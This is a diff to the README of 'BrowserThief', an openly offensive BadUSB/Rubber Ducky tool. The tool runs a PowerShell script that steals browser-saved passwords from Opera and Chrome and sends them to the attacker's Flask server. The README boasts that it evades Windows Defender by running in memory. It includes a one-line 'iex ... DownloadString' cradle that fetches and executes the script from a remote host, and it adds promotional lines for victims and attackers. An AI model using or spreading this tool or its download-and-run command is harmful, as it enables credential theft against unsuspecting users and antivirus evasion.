@@ -1,5 +1,5 @@
 # BrowserThief
-Rubber Ducky/BadUSB that runs a powershell script to extract and steal browser-saved passwords and stash them at your Flask web server. 
+All in one Rubber Ducky/BadUSB that runs a powershell script to extract and steal browser-saved passwords and stash them at your Flask web server. It currently extract passwords from Opera/OperaGX/Chrome, I will be adding support for more browsers soon!
 <br/><br/>
 ## Features
 - The powershell script can be run in-memory without writing to disk which evades Windows Defender detection
@@ -42,19 +42,18 @@ iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 ## PoC
 
 ### Victim POV
-
+Just plug your bad usb and watch the magic
 <p align="center">
 <img src="test/victim.gif?raw=true" width="800">
 </p>
-<br/><br/>
+<br/>
 
 ### Attacker POV
-
 <p align="center">
 <img src="test/attacker.gif?raw=true" width="800">
 </p>
 
-<br/><br/>
+<br/>
 
 ## Credits
 
